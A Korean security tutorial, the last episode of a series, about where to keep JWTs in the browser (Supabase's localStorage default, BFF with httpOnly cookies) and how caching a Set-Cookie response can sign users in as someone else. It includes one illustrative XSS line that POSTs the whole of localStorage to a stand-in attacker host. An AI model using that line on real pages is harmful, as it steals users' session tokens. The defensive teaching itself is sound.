# 7편. 토큰을 어디에 둘 것인가 — BFF와 쿠키

> 시리즈: 내 스택 안전하게 만들기
> 이 편에서 배우는 것: 브라우저에서 JWT 가 어디에 저장되는지(기본값을 소스로 확인), Supabase 가 `httpOnly` 를 **필수로 보지 않는** 이유, 그리고 **캐시 한 줄이 남의 계정으로 로그인시키는** 사고. 마지막으로 시리즈 전체를 한 장으로 정리합니다.

여섯 편 동안 **문을 잠갔습니다.** 이제 마지막 질문입니다.

**열쇠는 어디에 둘 겁니까?**

1편에서 JWT 의 성질 하나를 짚었습니다. **"가진 사람이 곧 그 사람"** — 이걸 **bearer**(소지자) 토큰이라고 부릅니다. 훔쳐가면 그 사람이 여러분이 됩니다. 그러니 어디에 두느냐가 그대로 보안 문제입니다.

---

## 브라우저에는 자리가 셋뿐입니다

표를 읽기 전에 한 단어만. **XSS**(Cross-Site Scripting)는 어떤 경로로든 — 광고 스크립트, 침해된 npm 패키지, 걸러지지 않은 입력 — **남의 자바스크립트가 여러분 페이지 안에서 실행되는** 사고입니다. 페이지 안에서 도는 스크립트는 여러분 코드와 **같은 권한**을 갖습니다. **여러분 JS 가 읽을 수 있는 건, 그 스크립트도 읽을 수 있습니다.**

| 자리 | XSS 가 나면 | 새로고침하면 | CSRF |
|---|---|---|---|
| **localStorage** | **읽힙니다** | 남아 있음 | 안전 |
| **자바스크립트 변수(메모리)** | **읽힙니다** | 사라짐 | 안전 |
| **쿠키 (`httpOnly`)** | 값은 못 읽습니다* | 남아 있음 | **열립니다** |

세 번째 줄이 중요합니다. `httpOnly` 쿠키는 **자바스크립트가 값을 못 읽습니다.** XSS 가 나도 토큰을 **훔쳐 나가지는** 못합니다. 대신 브라우저가 **알아서 붙여 보내므로** CSRF 가 열립니다. 5편에서 본 그 문제입니다.

> **\* 훔치지 못할 뿐, 쓰지 못하는 건 아닙니다.** XSS 가 났다면 공격자 스크립트는 **여러분 페이지 안에서** 요청을 보낼 수 있고, 쿠키는 거기에도 자동으로 붙습니다. **`httpOnly` 는 토큰 유출을 막지 XSS 를 해결하지 않습니다.**

**CSRF 가 열리는 원인은 `httpOnly` 가 아니라 "쿠키가 자동으로 실린다"는 성질입니다.** (요즘 브라우저는 `SameSite=Lax` 가 기본이라 최악까지는 잘 안 갑니다. 표의 "열립니다"는 **대비하지 않았을 때**의 이야기입니다.)

왼쪽 두 줄이 CSRF 에 안전한 이유는 반대 원리입니다. 거기 든 토큰은 **여러분 코드가 직접 꺼내 붙여야만** 전송됩니다. 남의 사이트는 그 코드를 실행시킬 수 없으니, 쿠키처럼 '자동으로 실려 가는' 일이 없습니다.

**공짜 자리는 없습니다.** XSS 를 막으면 CSRF 가 열리고, 그 반대도 마찬가지입니다.

---

## 그래서 Supabase 는 어디에 두나

문서를 읽는 대신 **설치해서 소스를 봤습니다.** `@supabase/auth-js` 2.112.4 입니다. [관찰]

```bash
npm i @supabase/supabase-js
# node_modules/@supabase/auth-js/dist/main/GoTrueClient.js
```

기본 설정:

```js
autoRefreshToken: true,
persistSession: true,          // ← 기본값
```

저장소를 정하는 부분:

```js
if (this.persistSession) {
    if (settings.storage) { this.storage = settings.storage }
    else {
        if (supportsLocalStorage()) { this.storage = globalThis.localStorage }   // ← 기본
        else { this.storage = memoryLocalStorageAdapter(this.memoryStorage) }
    }
}
```

**브라우저에서 아무 설정도 안 하면 JWT 는 `localStorage` 에 들어갑니다.**

표의 첫 줄이죠. **XSS 가 나면 읽힙니다.** 광고 스크립트 하나, 침해된 npm 패키지 하나면 이렇게 끝납니다.

```js
fetch('https://공격자.example/collect', {
  method: 'POST',
  body: JSON.stringify(localStorage),     // 한 줄이면 됩니다
})
```

---

## 🚨 그런데 Supabase 는 `httpOnly` 가 **필수는 아니라고** 합니다

여기서 대부분의 보안 글과 갈립니다. "무조건 `httpOnly` 쿠키"라고들 하는데, Supabase 공식 문서는 이렇게 말합니다. [문서]

> *"This is not necessary. Both the access token and refresh token are designed to be passed around to different components in your application. **The browser-based side of your application needs access to the refresh token** to properly maintain a browser session anyway."*

**틀린 말이 아닙니다.** 브라우저 쪽 SDK 가 토큰을 갱신하려면 **리프레시 토큰**(2편)을 읽어야 합니다. 못 읽게 만들면 그 기능이 죽습니다.

**그래서 선택지는 이렇게 정리됩니다.**

- **브라우저가 Supabase 를 직접 쓴다** → 토큰이 JS 에 노출되는 걸 받아들이고, **XSS 를 막는 데 집중**합니다. 도구는 스크립트 출처를 제한하는 **CSP**(Content-Security-Policy) 헤더와 의존성 관리입니다.
- **브라우저가 Supabase 를 직접 안 쓴다** → 토큰을 아예 안 넘기면 됩니다. **BFF 패턴**입니다.

**BFF 가 있는 구성이라면 두 번째 길이 열려 있습니다.**

**그런데 지금 어느 길에 있는지부터 확인합시다.** 로그인한 뒤 개발자 도구 → Application → Local Storage 에서 **`sb-` 로 시작하고 `-auth-token` 으로 끝나는** 키를 찾아보세요. [관찰] (정확히는 Supabase URL 의 **호스트명 첫 조각**이 가운데 들어갑니다 — `abc.supabase.co` 면 `sb-abc-auth-token`, 커스텀 도메인 `auth.내도메인.com` 이면 `sb-auth-auth-token` 입니다.)

- **있다** → 프론트 어딘가에서 브라우저 Supabase 클라이언트(`createClient()`)를 만들고 있습니다. **BFF 가 있어도 토큰은 브라우저에 있습니다.** 첫 번째 길입니다.
- **없다** → 토큰이 브라우저 JS 손이 닿는 곳에 없습니다. 두 번째 길입니다.

**BFF 를 가진 것과 브라우저가 Supabase 를 직접 안 쓰는 것은 다른 문제입니다.** 로그인 버튼 하나가 브라우저 클라이언트를 만들고 있으면, 이 편의 이점은 거기서 사라집니다.

---

## BFF — 브라우저에게 토큰을 안 주기

```
[ 토큰이 브라우저에 있는 구조 ]
브라우저 (JWT 보관) ──Authorization: Bearer──→ NestJS
   └ XSS 한 방 = 토큰 유출

[ BFF 가 토큰을 들고 있는 구조 ]
브라우저 ──httpOnly 쿠키(JWT)──→ BFF(Vercel) ──Bearer──→ NestJS
   └ JS 는 못 읽음                  └ 쿠키에서 꺼내 붙임
```

JWT 는 **`httpOnly` 쿠키 안에 담겨 오갑니다.** 서버 메모리에 쌓아두는 게 아닙니다 — 서버리스는 요청 사이에 상태가 없으니까요. 달라지는 건 **누가 읽을 수 있느냐**입니다. **브라우저 JS 는 못 읽고, 서버는 읽습니다.** XSS 가 나도 **꺼내 갈 토큰이 없습니다.**

> 그래서 5편에서 WebSocket 을 **쿠키**로 붙인 게 앞뒤가 맞습니다. 핸드셰이크에 쿠키가 자동으로 실리고, **NestJS 가 그 안의 JWT 를 직접 검증**할 수 있으니까요. 쿠키가 단순한 "로그인했음" 표시였다면 5편의 ①번 방법은 성립하지 않습니다.

대신 두 가지가 따라옵니다.

- **CSRF.** 쿠키는 자동으로 붙으니 `SameSite=Lax` + `Origin` 검증이 필요합니다. 5편에서 한 얘기 그대로입니다.
- **WebSocket.** 5편에서 봤듯 브라우저 WS 는 헤더를 못 붙입니다. 쿠키로 가거나, BFF 가 **짧은 수명의 티켓**을 발급해야 합니다.

---

토큰 **갱신**도 BFF 몫입니다. 액세스 토큰이 만료되면(2편) 브라우저가 아니라 BFF 가 리프레시 토큰으로 새 토큰을 받아, 새 세션 쿠키를 `Set-Cookie` 로 내려줍니다. 2편 끝에서 "갱신은 서버에서"라고 한 게 이겁니다.

**그리고 그 '내려주는 응답'이 다음 절의 주인공입니다.**

---

## 🚨 진짜 사고는 여기서 납니다 — 캐시

지금까지 여섯 편은 전부 **"문을 잠그는"** 얘기였습니다. 이건 다릅니다. **열쇠를 복사해서 아무한테나 나눠주는** 사고입니다.

서버에서 세션을 갱신하면 응답에 `Set-Cookie` 가 실립니다. **그 응답이 캐시되면** 어떻게 될까요.

직접 해봤습니다. 오리진은 요청한 사람의 토큰을 `Set-Cookie` 로 내려주고, 앞단 캐시는 응답을 통째로 저장했다가 다음 사람에게 줍니다. [관찰]

```js
// 오리진: 이 사람의 세션을 갱신해서 내려준다
res.writeHead(200, {
  'Set-Cookie': `session=JWT-for-${user}; Path=/`,
  'Cache-Control': 'public, max-age=60',      // ← 캐시해도 된다고 말함
})
```

alice 가 먼저 열고, bob 이 같은 주소를 엽니다.

```
alice 가 요청  [MISS]
   화면        : 안녕하세요, alice님
   받은 쿠키   : session=JWT-for-alice; Path=/

bob 이 요청  [HIT]
   화면        : 안녕하세요, alice님          ← 남의 화면
   받은 쿠키   : session=JWT-for-alice; Path=/  ← 남의 세션
```

([MISS] 는 캐시에 없어 오리진까지 간 요청, [HIT] 는 캐시가 저장해둔 응답을 그대로 받은 요청입니다. **bob 의 요청은 여러분 서버에 도달조차 안 했습니다.**)

**bob 의 브라우저가 alice 의 세션을 저장했습니다.** 이제 bob 은 alice 입니다.

Supabase 문서가 이 사고를 정확히 경고합니다. [문서]

> *"If your CDN (e.g. **Vercel Edge, Cloudflare**) caches that response and serves it to a different user, that user's browser will store the cached token and be **signed in as the wrong person**."*

> *"If you use **ISR** on pages that trigger a Supabase session refresh, the cached response will include the `Set-Cookie` header containing the refreshed JWT."*

**Vercel Edge 와 Cloudflare 를 이름으로 짚습니다.** 여러분이 쓰는 것들입니다.

> **다만 정확히 알아둡시다 — CDN 기본값은 이렇게 순진하지 않습니다.** Vercel 이 응답을 캐시하는 조건에 이 줄이 있습니다. [문서]
>
> *"Response doesn't contain the `set-cookie` header."*
>
> **`Set-Cookie` 가 붙어 있으면 Vercel CDN 은 아예 캐시하지 않습니다.** Cloudflare 도 기본값에서 *"Content is not cached"* 또는 *"Content may be cached with stripped set-cookie header"* 입니다. [문서]
>
> **그럼 왜 위험한가?** 위험한 건 CDN 의 기본 판단이 아니라 **여러분이 "캐시하라"고 명시하는 순간**입니다. 그게 **ISR** 입니다 — 미리 구워둔 페이지에 `Set-Cookie` 가 **같이 구워집니다.** Supabase 문서가 ISR 을 따로 떼어 경고하는 이유가 이겁니다. 위 실험은 **그 상황을 손으로 재현한 것**입니다.

### 왜 2편의 검증으로는 못 잡나

2편에서 JWT 검증을 배웠습니다. 서명, `iss`, `aud`, `exp`. **이 사고는 그걸 전부 통과합니다.**

토큰이 **진짜**고, 서명도 **맞고**, 만료도 **안 됐습니다.** 발급 대상만 다릅니다. 인증 실패가 아니라 **인증 성공인데 남의 신원**입니다. 검증으로 잡을 수 있는 종류의 문제가 아닙니다.

bearer 의 성질이 여기서 이빨을 드러냅니다. **가진 사람이 곧 그 사람** — 그래서 잘못 배달된 토큰도 완벽하게 유효합니다. 1편에서 **"서명은 위조를 막을 뿐 도난은 못 막는다"**고 했죠. 이건 아무도 훔치지 않은 도난입니다. **시스템이 직접 배달했습니다.** 막을 곳은 검증이 아니라 **배달 경로**뿐입니다.

### 같은 뿌리의 사고 하나 더

서버리스는 인스턴스를 **재사용**합니다. 그래서 모듈 최상단에 만들어둔 클라이언트는 요청 사이에 살아남습니다. [문서]

> Vercel Fluid compute: 모듈 스코프의 Supabase 클라이언트가 *"may be reused across requests from different users, causing one user's session to leak into another user's request."*

**서버 클라이언트는 요청마다 새로 만드세요.**

브라우저는 반대입니다 — 탭 하나에 사용자가 한 명이니 클라이언트를 하나만 만들어 계속 쓰는(싱글턴) 게 맞습니다. 서버 인스턴스 하나는 **여러 사용자의 요청을 번갈아 처리**하므로 같은 논리가 정확히 뒤집힙니다.

### 처방

- 인증이 걸린 라우트는 **캐시하지 않습니다.** 특히 **ISR**(Incremental Static Regeneration — Next.js 가 페이지를 미리 만들어두고 주기적으로 다시 굽는 기능)은 그 자체로 "이 응답을 캐시하라"는 선언입니다. **세션을 만지는 페이지에 걸면 위 실험이 그대로 재현됩니다.** 공개 페이지에는 써도 됩니다.
- `Set-Cookie` 가 실린 응답에 `Cache-Control: public` 이 붙지 않게 하세요.
- Supabase 클라이언트를 **모듈 스코프에 두지 마세요.** (2편의 `createRemoteJWKSet` 은 반대로 **모듈 레벨이 맞습니다** — 그건 사용자별 상태가 없는 **공개키 캐시**니까요. 사용자 세션을 들고 있는 것만 요청마다 새로 만듭니다.)

문서가 알려주는 구체적인 설정입니다. [문서]

- Next.js 에서 인증이 필요한 페이지에 **`export const dynamic = 'force-dynamic'`**
- 인증을 다루는 라우트 응답에 **`Cache-Control: private, no-store`**
- `@supabase/ssr` **0.10.0 이상**은 필요한 캐시 헤더를 자동으로 넘겨줍니다 (현재 배포판은 0.12.5)

---

## BFF 에서 한 가지 더

BFF 도 **서버 코드**입니다. 문서가 못 박습니다. [문서]

> *"**Never trust `supabase.auth.getSession()` inside server code** such as Proxy. It isn't guaranteed to revalidate the Auth token."*

`getSession()` 은 쿠키에 든 걸 그대로 돌려줄 뿐, **검증을 보장하지 않습니다.** 서버에서 접근을 막는 용도로 쓰면 안 됩니다.

대신 **`getClaims()`** 를 쓰라고 안내합니다 — *"Prefer this method over GoTrueClient.getUser which always sends a request to the Auth server for each JWT."* [문서]

`getClaims()` 는 **비대칭 키**(ECC/RSA)를 쓰는 프로젝트면 JWKS 로 **로컬에서 서명을 검증**하고, 대칭 키면 Auth 서버에 물어봅니다. **2편에서 NestJS 가드를 만들 때 짚었던 그 구분**입니다.

> **단 "로컬"에 별표가 붙습니다.** *"If your environment is ephemeral, such as a Lambda function that is destroyed after every request, a network request will be sent for each new invocation."* [문서] **서버리스 BFF 가 정확히 그 환경입니다** — 인스턴스가 새로 뜰 때마다 JWKS 를 다시 받습니다.

**🚨 그리고 `getClaims()` 로는 로그아웃을 못 잡습니다.** [문서]

> *"**The only way** to ensure that a user has logged out or their session has ended is to get the user's details with `getUser()`."*

서명과 만료만 보기 때문에 **로그아웃한 사용자의 토큰도 만료 전이면 통과합니다.** 문서 두 곳이 서로 당기는 것처럼 보이지만 — 한쪽은 "`getClaims()` 를 쓰라", 다른 쪽은 "로그아웃 확인은 `getUser()` 뿐" — **용도가 다릅니다.** 평소 접근 제어는 `getClaims()`, **끊어야 할 때는 `getUser()`**.

2편에서 한 말과 같습니다 — **"토큰이 있다"와 "토큰이 유효하다"는 다릅니다.** BFF 에도 똑같이 적용됩니다.

---

## 체크리스트

- [ ] 브라우저 JS 가 **JWT 를 읽을 수 있는지** 안다 (`localStorage` 기본값)
- [ ] 토큰이 브라우저에 있다면 **XSS 대책**이 있다 (CSP, 의존성 관리)
- [ ] BFF 를 쓴다면 브라우저 쿠키가 **`httpOnly`, `Secure`, `SameSite=Lax`** 다
- [ ] **인증이 걸린 라우트를 캐시하지 않는다** (세션을 만지는 페이지에 ISR 금지)
- [ ] `Set-Cookie` 응답에 **`Cache-Control: public` 이 없다**
- [ ] 서버의 Supabase 클라이언트가 **요청마다 새로 만들어진다**
- [ ] 서버에서 **`getSession()` 으로 접근을 막지 않는다** (`getClaims()` 를 쓴다)
- [ ] **즉시 차단이 필요한 자리**에는 `getUser()` 를 쓴다 (`getClaims()` 는 로그아웃을 모른다)
- [ ] 쿠키를 쓴다면 **`Origin` 검증**이 있다 (5편)

---

## 확인 못 한 것

- 위 캐시 실험의 **CDN 이름은 Supabase 문서가 짚은 것**이고, 실제 기본 동작은 위 인용대로 더 보수적입니다. 실무에서 이 사고가 나는 경로는 **ISR 처럼 캐시를 명시할 때**입니다.
- 위 캐시 실험은 **원리를 보이려고 직접 만든 것**입니다. 실제 Vercel/Cloudflare 의 캐시 판단 규칙은 이보다 복잡하고, 기본값이 이렇게 순진하지는 않습니다. **"이렇게 될 수 있다"이지 "항상 이렇게 된다"가 아닙니다.** 다만 **ISR 은 캐시하겠다고 여러분이 명시하는 기능**이라, 그 경우엔 순진한 기본값이 필요 없습니다 — 위 Supabase 인용이 정확히 그 상황입니다.
- 쿠키 크기: `@supabase/ssr` 0.12.5 소스에 **`MAX_CHUNK_SIZE = 3180`** 이 있습니다. JWT 가 크면 쿠키를 이 크기로 쪼개 담습니다. [관찰]
- `localStorage` 기본값은 **2.112.4** 기준입니다.

---

## 정리

- **브라우저에 안전한 자리는 없습니다.** `localStorage` 는 XSS 에, `httpOnly` 쿠키는 CSRF 에 열립니다.
- **Supabase 기본값은 `localStorage`** 입니다. 소스로 확인했습니다.
- **Supabase 는 `httpOnly` 를 필수로 보지 않습니다.** 브라우저 SDK 가 리프레시 토큰을 읽어야 하니까요. 통념과 다르지만 이유가 있습니다.
- **토큰을 브라우저에 안 주는 게 가장 확실합니다.** BFF 가 있다면 그 길이 열려 있습니다.
- **캐시가 `Set-Cookie` 를 나눠주면 남의 계정으로 로그인됩니다.** 검증으로는 못 잡습니다.
- **서버에서 `getSession()` 을 믿지 마세요.** 평소엔 `getClaims()`, **끊어야 할 때는 `getUser()`**.

---

## 시리즈를 마치며

여섯 편 동안 문을 잠갔고, 마지막 편에서는 **열쇠를 어디에 둘지** 정했습니다.

| | 배운 것 |
|---|---|
| 0 | Cloudflare 는 **대체재가 아니라 앞에 세우는 층**이다 |
| 1–2 | 진짜 인증 경계는 **NestJS** 다. 아무도 대신 해주지 않는다 |
| 3 | 웹훅은 로그인을 요구할 수 없다 — **공유 비밀**로 지킨다 |
| 4 | `run.app` **뒷문**을 닫지 않으면 앞문 공사는 무의미하다 |
| 5 | **전역 가드는 WebSocket 에 돌지 않는다** |
| 6 | 나가는 연결도 **상대를 확인해야** 한다. 그리고 **라이브러리 기본값은 다음 버전에 바뀐다** |
| 7 | **캐시가 세션을 나눠줄 수 있다** |

관통하는 이야기는 하나입니다. **남이 대신 해주는 보안은 여러분이 생각하는 그 지점까지만 갑니다.** Cloudflare 는 앞단까지, Supabase 는 발급까지, 라이브러리 기본값은 다음 메이저 버전까지.

그 경계가 어디인지 아는 것 — 그게 이 시리즈의 전부였습니다.

**가장 먼저 할 일 세 가지만 고르라면:**

1. **`run.app` 뒷문 닫기** (4편) — 나머지 전부의 전제입니다.
2. **`sslmode=verify-full` 명시** (6편) — 글자 몇 개입니다.
3. **인증 라우트 캐시 끄기** (7편) — 가장 조용하고 가장 위험합니다.

> 이전 편: [6편. 나가는 문 — Cloud Run에서 PlanetScale로](./06-egress.md)
